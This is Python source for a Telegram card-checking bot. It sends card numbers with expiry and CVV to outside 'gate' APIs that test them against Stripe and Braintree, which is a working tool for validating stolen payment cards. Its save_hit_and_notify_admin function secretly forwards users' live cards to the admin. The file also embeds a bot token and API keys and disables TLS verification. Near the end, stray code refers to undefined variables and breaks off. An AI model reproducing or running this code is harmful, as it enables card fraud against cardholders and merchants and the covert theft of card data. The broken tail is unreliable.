import asyncio
import time
import json
import random
import tempfile
import os
import sys

# Fix Windows console encoding for emoji support
if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler, ChatMemberHandler
import aiohttp
import logging

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = "8036201786:AAFLPZcagcVGcVI6t6U48ENsFUx-ByTM2f4"  # Replace with your bot token
POCOLINKS_API_KEY = "2d9561c4f885f7ca02ee411fd6acddd8a76c7c8"
CHECK_API_URL = "https://web-production-431c6.up.railway.app/check"  # Infinite Auto API (Stripe Auth)
SB_API_URL = "https://web-production-fd6d4.up.railway.app/api/check"  # SB gate API (Stripe Charge $5)
BA_API_URL = "https://web-production-2570b.up.railway.app/api/check-card"  # BA gate API (Braintree Auth)
HANDY_API_KEY = "HAS-0YEnXQKHN3qk0c4536yBdx" 


# Admin system configuration
ADMIN_ID = 8375711283
ADMIN_USERNAME = "@devtronexop"  # Admin contact username

# Global Limiter for API requests to prevent rate limits
# This ensures controlled concurrent requests
GLOBAL_REQUEST_SEMAPHORE = None # Will be initialized in main()

import json
import os
from datetime import datetime, timedelta

def get_ist_time():
    """Get current time in IST (UTC+5:30)."""
    return datetime.utcnow() + timedelta(hours=5, minutes=30)

# File to store authorized users
USERS_FILE = "authorized_users.json"
# File to store user tracking data
USER_TRACKING_FILE = "user_tracking.json"
# File to store bot settings (including authorization state)
BOT_SETTINGS_FILE = "bot_settings.json"
# File to store group tracking data
GROUP_TRACKING_FILE = "group_tracking.json"
# File to store gateway cookies
COOKIES_FILE = "gateway_cookies.json"
# File to store group authorization data
GROUP_AUTH_FILE = "group_auth.json"
HIT_LOG_FILE = "hits.json"

def load_bot_settings():
    """Load bot settings from file."""
    try:
        if os.path.exists(BOT_SETTINGS_FILE):
            with open(BOT_SETTINGS_FILE, 'r') as f:
                return json.load(f)
        else:
            return {'authorization_enabled': False}  # Default: disabled
    except Exception as e:
        print(f"Error loading bot settings: {e}")
        return {'authorization_enabled': False}

def save_bot_settings():
    """Save bot settings to file."""
    try:
        with open(BOT_SETTINGS_FILE, 'w') as f:
            json.dump(bot_settings, f, indent=2)
    except Exception as e:
        print(f"Error saving bot settings: {e}")

def toggle_maintenance():
    """Toggle maintenance mode on/off."""
    global bot_settings
    bot_settings['maintenance_mode'] = not bot_settings.get('maintenance_mode', False)
    save_bot_settings()
    return bot_settings['maintenance_mode']

def is_maintenance_mode():
    """Check if maintenance mode is enabled."""
    return bot_settings.get('maintenance_mode', False)

def toggle_authorization():
    """Toggle authorization mode on/off."""
    global bot_settings
    bot_settings['authorization_enabled'] = not bot_settings.get('authorization_enabled', False)
    save_bot_settings()
    return bot_settings['authorization_enabled']

def is_authorization_enabled():
    """Check if authorization is enabled."""
    return bot_settings.get('authorization_enabled', False)

# Gateway Status Functions
def is_gateway_enabled(gateway_name):
    """Check if a specific gateway is enabled. Default: enabled"""
    return bot_settings.get(f'gateway_{gateway_name}_enabled', True)

def toggle_gateway(gateway_name):
    """Toggle gateway on/off."""
    global bot_settings
    current = bot_settings.get(f'gateway_{gateway_name}_enabled', True)
    bot_settings[f'gateway_{gateway_name}_enabled'] = not current
    save_bot_settings()
    return not current

def get_gateway_status_text(gateway_name):
    """Get status text for gateway."""
    return "🟢 Enabled" if is_gateway_enabled(gateway_name) else "🔴 Disabled"

# Backward compatibility functions (deprecated - use gateway functions instead)
def is_sb_private():
    """Check if /sb gate is set to private. DEPRECATED: Use is_gateway_enabled('sb') instead."""
    # Inverted logic: if gateway is disabled, it's "private" (not accessible)
    return not is_gateway_enabled('sb')

def toggle_sb_privacy():
    """Toggle /sb privacy mode. DEPRECATED: Use toggle_gateway('sb') instead."""
    return not toggle_gateway('sb')  # Inverted because privacy = disabled

# Load bot settings on startup
bot_settings = load_bot_settings()

def is_user_punished(user_id):
    """Check if user is banned or suspended."""
    user_id_str = str(user_id)
    if is_admin(user_id):
        return False, None
        
    stats = user_tracking.get(user_id_str)
    if not stats:
        return False, None
        
    if stats.get('banned', False):
        return True, "🚫 You are **PERMANENTLY BANNED** from using this bot."
        
    suspended_until = stats.get('suspended_until')
    if suspended_until:
        try:
            until_dt = datetime.fromisoformat(suspended_until)
            if get_ist_time() < until_dt:
                time_left = until_dt - get_ist_time()
                days = time_left.days
                hours, remainder = divmod(time_left.seconds, 3600)
                minutes, _ = divmod(remainder, 60)
                
                time_str = []
                if days > 0: time_str.append(f"{days}d")
                if hours > 0: time_str.append(f"{hours}h")
                if minutes > 0: time_str.append(f"{minutes}m")
                
                return True, f"⏳ You are **SUSPENDED**.\nRemaining: `{' '.join(time_str)}`"
            else:
                return False, None
        except:
            return False, None
            
    return False, None

def is_group_punished(chat_id):
    """Check if group is banned or suspended."""
    chat_id_str = str(chat_id)
    if not group_tracking:
        return False, None
        
    stats = group_tracking.get(chat_id_str)
    if not stats:
        return False, None
        
    if stats.get('banned', False):
        return True, "🚫 This **GROUP IS BANNED** from using this bot.\n\nAdmin has restricted access for this group."
        
    suspended_until = stats.get('suspended_until')
    if suspended_until:
        try:
            until_dt = datetime.fromisoformat(suspended_until)
            if get_ist_time() < until_dt:
                time_left = until_dt - get_ist_time()
                days = time_left.days
                hours, remainder = divmod(time_left.seconds, 3600)
                minutes, _ = divmod(remainder, 60)
                
                time_str = []
                if days > 0: time_str.append(f"{days}d")
                if hours > 0: time_str.append(f"{hours}h")
                if minutes > 0: time_str.append(f"{minutes}m")
                
                return True, f"⏳ This **GROUP IS SUSPENDED**.\nRemaining: `{' '.join(time_str)}`"
            else:
                return False, None
        except:
            return False, None
            
    return False, None

async def auto_unban_worker_with_bot(bot):
    """Background worker to check expired suspensions every minute and notify users."""
    while True:
        try:
            now = get_ist_time()
            for user_id_str, stats in list(user_tracking.items()):
                suspended_until = stats.get('suspended_until')
                if suspended_until:
                    try:
                        until_dt = datetime.fromisoformat(suspended_until)
                        if now >= until_dt:
                            # Auto unban
                            stats['suspended_until'] = None
                            stats['banned'] = False
                            save_user_tracking()
                            
                            # Notify user
                            try:
                                await bot.send_message(
                                    chat_id=int(user_id_str),
                                    text="✅ **YOUR SUSPENSION HAS ENDED!**\n\nYou are now unbanned and can use the bot again.",
                                    parse_mode='Markdown'
                                )
                            except: pass
                            print(f"DEBUG: Auto-unbanned user {user_id_str}")
                    except: continue
        except Exception as e:
            print(f"Error in background unban: {e}")
        await asyncio.sleep(60)

async def auto_unban_groups_worker_with_bot(bot):
    """Background worker to check expired group suspensions every minute and notify groups."""
    while True:
        try:
            now = get_ist_time()
            for chat_id_str, stats in list(group_tracking.items()):
                suspended_until = stats.get('suspended_until')
                if suspended_until:
                    try:
                        until_dt = datetime.fromisoformat(suspended_until)
                        if now >= until_dt:
                            # Auto unban
                            stats['suspended_until'] = None
                            stats['banned'] = False
                            save_group_tracking()
                            
                            # Notify group
                            try:
                                await bot.send_message(
                                    chat_id=int(chat_id_str),
                                    text="✅ **GROUP SUSPENSION HAS ENDED!**\n\nThe bot is now active in this group again.",
                                    parse_mode='Markdown'
                                )
                            except: pass
                            print(f"DEBUG: Auto-unbanned group {chat_id_str}")
                    except: continue
        except Exception as e:
            print(f"Error in background group unban: {e}")
        await asyncio.sleep(60)

def load_authorized_users():
    """Load authorized users from file."""
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r') as f:
                users_data = json.load(f)
                return set(users_data.get('users', [ADMIN_ID]))
        else:
            return {ADMIN_ID}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {ADMIN_ID}

def save_authorized_users():
    """Save authorized users to file."""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump({'users': list(authorized_users)}, f, indent=2)
    except Exception as e:
        print(f"Error saving users: {e}")

# Load authorized users on startup
authorized_users = load_authorized_users()

# ============ USER TRACKING SYSTEM ============

def load_user_tracking():
    """Load user tracking data from file."""
    try:
        if os.path.exists(USER_TRACKING_FILE):
            with open(USER_TRACKING_FILE, 'r') as f:
                return json.load(f)
        else:
            return {}
    except Exception as e:
        print(f"Error loading user tracking: {e}")
        return {}

def save_user_tracking():
    """Save user tracking data to file."""
    try:
        with open(USER_TRACKING_FILE, 'w') as f:
            json.dump(user_tracking, f, indent=2)
    except Exception as e:
        print(f"Error saving user tracking: {e}")

# Load user tracking on startup
user_tracking = load_user_tracking()

# ============ GROUP TRACKING SYSTEM ============

def load_group_tracking():
    """Load group tracking data from file."""
    try:
        if os.path.exists(GROUP_TRACKING_FILE):
            with open(GROUP_TRACKING_FILE, 'r') as f:
                return json.load(f)
        else:
            return {}
    except Exception as e:
        print(f"Error loading group tracking: {e}")
        return {}

def save_group_tracking():
    """Save group tracking data to file."""
    try:
        with open(GROUP_TRACKING_FILE, 'w') as f:
            json.dump(group_tracking, f, indent=2)
    except Exception as e:
        print(f"Error saving group tracking: {e}")

# Load group tracking on startup
group_tracking = load_group_tracking()

# ============ LEGACY GATEWAY SYSTEM (DEPRECATED - NOW USING API) ============
# Keeping these for backward compatibility but not actively used

MAX_GATEWAY_SLOTS = 10
gateway_cookies = {"gateway_slots": [], "current_slot_index": 0}  # Empty placeholder

# Legacy functions kept for compatibility
def get_active_slot_count():
    return 0

def load_gateway_cookies():
    return {"gateway_slots": [], "current_slot_index": 0}

def save_gateway_cookies():
    pass

# ============ END LEGACY SYSTEM ============




def get_group_stats(chat_id, title=None):
    """Get or create group statistics."""
    chat_id_str = str(chat_id)
    if chat_id_str not in group_tracking:
        group_tracking[chat_id_str] = {
            'chat_id': chat_id,
            'title': title or "Unknown Group",
            'link': None,
            'join_time': get_ist_time().strftime('%Y-%m-%d %I:%M:%S %p'),
            'last_active': get_ist_time().isoformat(),
            'total_cards_checked': 0,
            'banned': False,
            'suspended_until': None,
            'members_count': 0
        }
        save_group_tracking()
    return group_tracking[chat_id_str]

def update_group_activity(chat_id, title=None):
    """Update group's last active time and info."""
    stats = get_group_stats(chat_id, title=title)
    stats['last_active'] = get_ist_time().isoformat()
    if title:
        stats['title'] = title
    save_group_tracking()
    return stats

def get_user_stats(user_id):
    """Get or create user statistics."""
    user_id_str = str(user_id)
    if user_id_str not in user_tracking:
        user_tracking[user_id_str] = {
            'user_id': user_id,
            'username': None,
            'first_name': None,
            'last_name': None,
            'join_time': get_ist_time().strftime('%Y-%m-%d %I:%M:%S %p'),
            'last_active': get_ist_time().isoformat(),
            'total_cards_checked': 0,
            'cards_approved': 0,
            'cards_declined': 0,
            'sb_cards_checked': 0,
            'sb_cards_approved': 0,
            'sb_cards_declined': 0,
            'bin_lookups': 0,
            'files_uploaded': 0,
            'features_used': {
                'start': 0,
                'help': 0,
                'bin_lookup': 0,
                'single_card_check': 0,
                'multi_card_check': 0,
                'file_upload': 0,
                'pause': 0,
                'resume': 0,
                'stop': 0,
                'wallet': 0,
                'stripe_charge_sb': 0
            },
            'sessions_count': 0,
            'is_new_user': True,
            'banned': False,
            'suspended_until': None
        }
        save_user_tracking()
    
    # Check for daily credit reset
    reset_daily_credits(user_id_str)
    return user_tracking[user_id_str]

def reset_daily_credits(user_id_str):
    """Credits are disabled."""
    pass

def update_user_activity(user_id, username=None, first_name=None, last_name=None):
    """Update user's last active time and info."""
    stats = get_user_stats(user_id)
    stats['last_active'] = get_ist_time().isoformat()
    if username:
        stats['username'] = username
    if first_name:
        stats['first_name'] = first_name
    if last_name:
        stats['last_name'] = last_name
    save_user_tracking()
    return stats

def increment_feature_usage(user_id, feature_name, chat_id=None):
    """Increment usage count for a specific feature."""
    stats = get_user_stats(user_id)
    if feature_name in stats['features_used']:
        stats['features_used'][feature_name] += 1
    stats['last_active'] = get_ist_time().isoformat()
    save_user_tracking()
    
    if chat_id and str(chat_id).startswith('-'):
        update_group_activity(chat_id)

def increment_card_stats(user_id, approved=False, chat_id=None):
    """Increment card checking statistics."""
    stats = get_user_stats(user_id)
    stats['total_cards_checked'] += 1
    if approved:
        stats['cards_approved'] += 1
    else:
        stats['cards_declined'] += 1
    stats['last_active'] = get_ist_time().isoformat()
    save_user_tracking()

    if chat_id and str(chat_id).startswith('-'):
        gstats = get_group_stats(chat_id)
        gstats['total_cards_checked'] += 1
        gstats['last_active'] = get_ist_time().isoformat()
        save_group_tracking()

def get_time_ago(iso_time):
    """Convert ISO time to human readable time ago format."""
    try:
        dt = datetime.fromisoformat(iso_time)
        now = get_ist_time()
        diff = now - dt
        
        if diff.days > 0:
            return f"{diff.days}d ago"
        elif diff.seconds >= 3600:
            return f"{diff.seconds // 3600}h ago"
        elif diff.seconds >= 60:
            return f"{diff.seconds // 60}m ago"
        else:
            return "Just now"
    except:
        return "Unknown"

def is_user_online(iso_time, threshold_minutes=5):
    """Check if user is considered online (active within threshold)."""
    try:
        dt = datetime.fromisoformat(iso_time)
        now = get_ist_time()
        diff = now - dt
        return diff.seconds < (threshold_minutes * 60) and diff.days == 0
    except:
        return False

def parse_time_duration(duration_str):
    """Parse string like '1d 2h 30m' into total minutes."""
    try:
        total_minutes = 0
        parts = duration_str.lower().split()
        for part in parts:
            if 'd' in part: total_minutes += int(part.replace('d', '')) * 1440
            elif 'h' in part: total_minutes += int(part.replace('h', '')) * 60
            elif 'm' in part: total_minutes += int(part.replace('m', ''))
        return total_minutes if total_minutes > 0 else None
    except:
        return None

async def notify_admin_new_user(context, user):
    """Notify admin about a new user."""
    try:
        user_id = user.id
        username = user.username or "N/A"
        first_name = user.first_name or "N/A"
        last_name = user.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        
        notification = (
            f"🆕 NEW USER JOINED! 🆕\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 User ID: `{user_id}`\n"
            f"📛 Name: {full_name}\n"
            f"🔗 Username: @{username}\n"
            f"⏰ Joined: {get_ist_time().strftime('%Y-%m-%d %I:%M:%S %p')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 Use /userstats `{user_id}` to view their activity"
        )
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=notification,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Error notifying admin about new user: {e}")

async def on_my_chat_member_update(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle updates when the bot's own chat member status changes."""
    result = update.my_chat_member
    if not result:
        return

    chat = result.chat
    old_status = result.old_chat_member.status
    new_status = result.new_chat_member.status
    
    # If the bot was added to a group/channel
    if old_status in ["left", "kicked"] and new_status in ["member", "administrator"]:
        print(f"DEBUG: Bot added to {chat.type} '{chat.title}' (ID: {chat.id})")
        
        # Track group
        stats = get_group_stats(chat.id, title=chat.title)
        
        # Update activity
        update_group_activity(chat.id, title=chat.title)
        
        # Get invite link if possible
        invite_link = "N/A"
        try:
             invite_link = chat.invite_link or await context.bot.export_chat_invite_link(chat.id)
             stats['link'] = invite_link
             save_group_tracking()
        except: pass

        # Get member count
        try:
            count = await context.bot.get_chat_member_count(chat.id)
            stats['members_count'] = count
            save_group_tracking()
        except: pass

        # Notify admin
        notification = (
            f"🏰 **NEW GROUP JOINED!** 🏰\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📛 Name: {chat.title}\n"
            f"🆔 ID: `{chat.id}`\n"
            f"👤 Type: {chat.type.capitalize()}\n"
            f"👥 Members: {stats.get('members_count', 'N/A')}\n"
            f"🔗 Link: {invite_link}\n"
            f"⏰ Time: {get_ist_time().strftime('%Y-%m-%d %I:%M:%S %p')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 Use `/groupstats {chat.id}` to manage"
        )
        await context.bot.send_message(chat_id=ADMIN_ID, text=notification, parse_mode='Markdown')

    # If the bot was removed from a group/channel
    elif old_status in ["member", "administrator"] and new_status in ["left", "kicked"]:
         print(f"DEBUG: Bot removed from {chat.type} '{chat.title}' (ID: {chat.id})")

async def save_hit_and_notify_admin(context, user, cc_data, status_msg, gate_name="Unknown"):
    """Secretly log hits and notify admin."""
    try:
        # Clean up status_msg to remove indexes like [1/5]
        import re
        status_clean = re.sub(r'\[\d+/\d+\]', '', status_msg).strip()
        
        hit_data = {
            "time": get_ist_time().isoformat(),
            "user_id": user.id,
            "username": user.username,
            "full_name": f"{user.first_name} {user.last_name or ''}".strip(),
            "card": cc_data,
            "status": status_clean,
            "gate": gate_name
        }
        
        # Save to hits.json
        hits = []
        if os.path.exists(HIT_LOG_FILE):
            try:
                with open(HIT_LOG_FILE, 'r') as f:
                    hits = json.load(f)
            except: hits = []
        
        hits.append(hit_data)
        with open(HIT_LOG_FILE, 'w') as f:
            json.dump(hits, f, indent=2)
            
        # Notify admin
        notify_text = (
            f"🎯 NEW HIT DETECTED! 🎯\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 User: {hit_data['full_name']} (@{user.username})\n"
            f"🆔 ID: `{user.id}`\n"
            f"💳 Card: `{cc_data}`\n"
            f"📊 Status: {status_clean}\n"
            f"🔌 Gate: {gate_name}\n"
            f"⏰ Time: {get_ist_time().strftime('%Y-%m-%d %I:%M:%S %p')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"✨ Keep it private! 😉"
        )
        await context.bot.send_message(chat_id=ADMIN_ID, text=notify_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error in secret hit handler: {e}")

async def notify_admin_gateway_error(context, slot_id, cc_data, error_msg, error_type="API Error"):
    """Notify admin about API errors for debugging."""
    try:
        notify_text = (
            f"⚠️ **API ERROR DETECTED** ⚠️\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔌 **Source:** API Gateway\n"
            f"💳 **Card Tested:** `{cc_data}`\n"
            f"❌ **Error Type:** {error_type}\n"
            f"📝 **Error Message:** {error_msg}\n"
            f"⏰ **Time:** {get_ist_time().strftime('%Y-%m-%d %I:%M:%S %p')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 **Action:** Check API endpoint status"
        )
        await context.bot.send_message(chat_id=ADMIN_ID, text=notify_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error in API error notification: {e}")

# Global variables for controlling card checking process
checking_sessions = {}  # Store active checking sessions
paused_sessions = set()  # Store paused session IDs

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(url, method='GET', data=None, headers=None, cookies=None):
    """Make HTTP request with aiohttp (async) with focus on stability."""
    
    async with GLOBAL_REQUEST_SEMAPHORE:
        try:
            # Reusing a basic connector for stability
            import ssl
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            timeout = aiohttp.ClientTimeout(total=60, connect=20)
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.request(
                    method, 
                    url, 
                    data=data, 
                    headers=headers, 
                    cookies=cookies,
                    ssl=ssl_context
                ) as response:
                    body = await response.text()
                    return body, response.status
        except Exception as e:
            print(f"DEBUG: aiohttp request failed: {e}")
            
            # Fallback to requests if aiohttp fails
            try:
                import requests
                from urllib3.exceptions import InsecureRequestWarning
                import urllib3
                urllib3.disable_warnings(InsecureRequestWarning)
                
                # Run blocking request in a thread to keep bot alive
                def do_req():
                    return requests.request(
                        method=method,
                        url=url,
                        data=data,
                        headers=headers,
                        cookies=cookies,
                        verify=False,
                        timeout=30
                    )
                
                response = await asyncio.to_thread(do_req)
                return response.text, response.status_code
            except Exception as e2:
                print(f"DEBUG: All request methods failed: {e2}")
                return None, 0

async def check_card(cards, card_num, total_cards, session_id=None):
    """Check card using the new API endpoint."""
    cc, mon, year, cvv = cards.split("|")
    year = year[-2:] if len(year) == 4 else year
    cc = cc.replace(" ", "")
    start_time = time.time()

    # Helper function to check if session is still active
    def is_session_active():
        if session_id is None:
            return True
        if session_id not in checking_sessions:
            return False
        if not checking_sessions[session_id]['active']:
            return False
        if session_id in paused_sessions:
            return False
        return True

    # Check session status before starting
    if not is_session_active():
        if session_id in checking_sessions and not checking_sessions[session_id]['active']:
            return f"⏹️ [{card_num}/{total_cards}] Card check stopped", False
        return f"⏸️ [{card_num}/{total_cards}] Card check paused", False

    # Prepare API request
    async with GLOBAL_REQUEST_SEMAPHORE:
        try:
            # Correct URL construction for au1.py GET API
            # Format: /check?cc=cc|mm|yy|cvv
            full_card = f"{cc}|{mon}|{year}|{cvv}"
            # Construct URL with query info
            request_url = f"{CHECK_API_URL}?cc={full_card}"
            
            timeout = aiohttp.ClientTimeout(total=60, connect=20)
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(request_url) as response:
                    if response.status != 200:
                        return f"❌ [{card_num}/{total_cards}] API Error (HTTP {response.status})", False
                    
                    result_data = await response.json()
                    
        except asyncio.TimeoutError:
            return f"❌ [{card_num}/{total_cards}] Connection timeout! Server not responding.", False
        except Exception as e:
            # Notify admin about connection issues
            if session_id and session_id in checking_sessions:
                ctx = checking_sessions[session_id].get('context')
                if ctx:
                    asyncio.create_task(notify_admin_gateway_error(
                        context=ctx,
                        slot_id=0,
                        cc_data=f"{cc}|{mon}|{year}|{cvv}",
                        error_msg=f"API Connection Error: {str(e)}",
                        error_type="Network Error"
                    ))
            return f"❌ [{card_num}/{total_cards}] Connection Error! Please try again later.", False

    # Process API response
    try:
        time_taken = time.time() - start_time
        
        # Get BIN info
        bin_data = await bin_lookup(cc[:6])
        country = bin_data.get('country', 'UNKNOWN') if bin_data else 'UNKNOWN'
        issuer = bin_data.get('issuer', 'UNKNOWN') if bin_data else 'UNKNOWN'
        brand = bin_data.get('brand', 'UNKNOWN') if bin_data else 'UNKNOWN'
        card_type = bin_data.get('type', 'UNKNOWN') if bin_data else 'UNKNOWN'
        
        # Check if approved
        # Check if approved
        status = result_data.get('status', '').lower()
        is_approved = status == 'approved' or status == 'success'
        
        # Use pre-formatted bot message from API if available
        if 'bot_message' in result_data:
            bot_msg = result_data['bot_message']
            
            # Parse the bot message to extract status
            if "✅ ᴀᴘᴘʀᴏᴠᴇᴅ" in bot_msg:
                status_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
                emoji = "✅"
                is_approved = True
            else:
                status_text = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
                emoji = "❌"
                is_approved = False
            
            # Extract error/response message from bot_message
            if "𝗘𝗿𝗿𝗼𝗿:" in bot_msg:
                msg_part = bot_msg.split("𝗘𝗿𝗿𝗼𝗿:")[-1].strip()
            elif "𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:" in bot_msg:
                msg_part = bot_msg.split("𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:")[-1].strip()
            else:
                msg_part = result_data.get('message', 'Unknown response')
            
            # Format with BIN info
            result = (
                f"{status_text} {emoji} [{card_num}/{total_cards}]\n"
                f"━━━━━━━━━━━━━\n"
                f"[⟐] 𝗖𝗖 - `{cc}|{mon}|{year}|{cvv}`\n"
                f"[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {msg_part}\n"
                f"[⟐] 𝗚𝗮𝘁𝗲 - Stripe Auth 💎\n"
                f"━━━━━━━━━━━━━\n"
                f"[⟐] 𝗕𝗶𝗻 : `{cc[:6]}`\n"
                f"[⟐] 𝗖𝐨𝐮𝐧𝘁𝗿𝘆 : {country}\n"
                f"[⟐] 𝗜𝘀𝘀𝐮𝗲𝗿 : {issuer}\n"
                f"[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {card_type}\n"
                f"━━━━━━━━━━━━━\n"
                f"[⟐] T/t : {time_taken:.1f}s"
            )
            return result, is_approved
            
        message = result_data.get('message', 'Unknown response')
        
        if is_approved:
            status_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
            emoji = "✅"
        else:
            status_text = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
            emoji = "❌"
        
        # Format result
        result = (
            f"{status_text} {emoji} [{card_num}/{total_cards}]\n"
            f"━━━━━━━━━━━━━\n"
            f"[⟐] 𝗖𝗖 - `{cc}|{mon}|{year}|{cvv}`\n"
            f"[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {message}\n"
            f"[⟐] 𝗚𝗮𝘁𝗲 - Stripe Auth 💎\n"
            f"━━━━━━━━━━━━━\n"
            f"[⟐] 𝗕𝗶𝗻 : `{cc[:6]}`\n"
            f"[⟐] 𝗖𝐨𝐮𝗻𝘁𝗿𝘆 : {country}\n"
            f"[⟐] 𝗜𝘀𝘀𝐮𝗲𝗿 : {issuer}\n"
            f"[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {card_type}\n"
            f"━━━━━━━━━━━━━\n"
            f"[⟐] T/t : {time_taken:.1f}s"
        )
        
        return result, is_approved
        
    except Exception as e:
        return f"❌ [{card_num}/{total_cards}] Error processing response: {str(e)}", False


async def ba_check_card(cards, card_num, total_cards, session_id=None):
    """Check card using Braintree Auth API endpoint."""
    cc, mon, year, cvv = cards.split("|")
    year = year[-2:] if len(year) == 4 else year
    cc = cc.replace(" ", "")
    start_time = time.time()

    # Check if session is still active
    def is_session_active():
        if not session_id:
            return True
        if session_id not in checking_sessions:
            return False
        return checking_sessions[session_id]['active']

    # Check session status before starting
    if not is_session_active():
        if session_id in checking_sessions and not checking_sessions[session_id]['active']:
            return f"⏹️ [{card_num}/{total_cards}] Card check stopped", False
        return f"⏸️ [{card_num}/{total_cards}] Card check paused", False

    # Prepare API request
    async with GLOBAL_REQUEST_SEMAPHORE:
        try:
            payload = {
                "card_number": cc,
                "exp_month": mon,
                "exp_year": year,
                "cvv": cvv
            }
            
            timeout = aiohttp.ClientTimeout(total=60, connect=20)
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.post(BA_API_URL, json=payload) as response:
                    if response.status != 200:
                        return f"❌ [{card_num}/{total_cards}] API Error (HTTP {response.status})", False
                    
                    result_data = await response.json()
                    
        except asyncio.TimeoutError:
            return f"❌ [{card_num}/{total_cards}] Connection timeout! Server not responding.", False
        except Exception as e:
            # Notify admin about connection issues
            if session_id and session_id in checking_sessions:
                ctx = checking_sessions[session_id].get('context')
                if ctx:
                    asyncio.create_task(notify_admin_gateway_error(
                        context=ctx,
                        slot_id=0,
                        cc_data=f"{cc}|{mon}|{year}|{cvv}",
                        error_msg=f"Braintree API Error: {str(e)}",
                        error_type="Network Error"
                    ))
            return f"❌ [{card_num}/{total_cards}] Connection Error! Please try again later.", False

    # Process API response
    try:
        time_taken = time.time() - start_time
        
        # Get BIN info
        bin_data = await bin_lookup(cc[:6])
        country = bin_data.get('country', 'UNKNOWN') if bin_data else 'UNKNOWN'
        issuer = bin_data.get('issuer', 'UNKNOWN') if bin_data else 'UNKNOWN'
        brand = bin_data.get('brand', 'UNKNOWN') if bin_data else 'UNKNOWN'
        card_type = bin_data.get('type', 'UNKNOWN') if bin_data else 'UNKNOWN'
        
        # Check if approved
        status = result_data.get('status', '').lower()
        message = result_data.get('message', 'Unknown response')
        is_approved = False
        
        if status == 'authenticated' or 'success' in status or result_data.get('success'):
            is_approved = True
            status_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
            emoji = "✅"
        else:
            status_text = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
            emoji = "❌"
            # Extract actual error message from API response
            if 'error' in result_data:
                message = result_data['error']
            elif 'message' in result_data:
                # Keep the actual API message
                pass
            else:
                message = "Card Declined"
        
        # Format result
        result = (
            f"{status_text} {emoji} [{card_num}/{total_cards}]\n"
            f"━━━━━━━━━━━━━\n"
            f"[⟐] 𝗖𝗖 - `{cc}|{mon}|{year}|{cvv}`\n"
            f"[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {message}\n"
            f"[⟐] 𝗚𝗮𝘁𝗲 - Braintree Auth 🔐\n"
            f"━━━━━━━━━━━━━\n"
            f"[⟐] 𝗕𝗶𝗻 : `{cc[:6]}`\n"
            f"[⟐] 𝗖𝐨𝐮𝐧𝘁𝗿𝐲 : {country}\n"
            f"[⟐] 𝗜𝘀𝘀𝐮𝗲𝗿 : {issuer}\n"
            f"[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {card_type}\n"
            f"━━━━━━━━━━━━━\n"
            f"[⟐] T/t : {time_taken:.1f}s"
        )
        
        return result, is_approved
        
    except Exception as e:
        return f"❌ [{card_num}/{total_cards}] Error processing response: {str(e)}", False

            
        # Default values
        is_approved = False
        error_msg = "Unknown error"
        
        if isinstance(result_data, dict):
            if result_data.get('success'):
                is_approved = True
            else:
                # Extract error message
                try:
                    if 'data' in result_data and 'error' in result_data['data']:
                        error_msg = result_data['data']['error']['message']
                    elif 'message' in result_data:
                        error_msg = result_data['message']
                    else:
                        error_msg = str(result_data)
                except:
                    error_msg = str(result_data)
                
                # Treat insufficient funds as a hit/approved
                if 'insufficient' in error_msg.lower():
                    is_approved = True
        elif req3.strip() == "0" and status3 == 400:
            error_msg = "Server rejected request (Bad Request)"
        elif req3.strip().isdigit():
            # Handle non-JSON responses like "0", "1", etc.
            error_code = req3.strip()
            if error_code == "0":
                error_msg = "Server rejected request (Authentication/Session issue)"
            elif error_code == "1":
                error_msg = "Server error (Invalid parameters)"
            else:
                error_msg = f"Server error (Code: {error_code})"
        else:
            error_msg = f"Invalid response: {req3}"

        # --- FORMATTING LOGIC ---
        
        time_taken = time.time() - start_time
        bin_data = await bin_lookup(cc[:6])
        
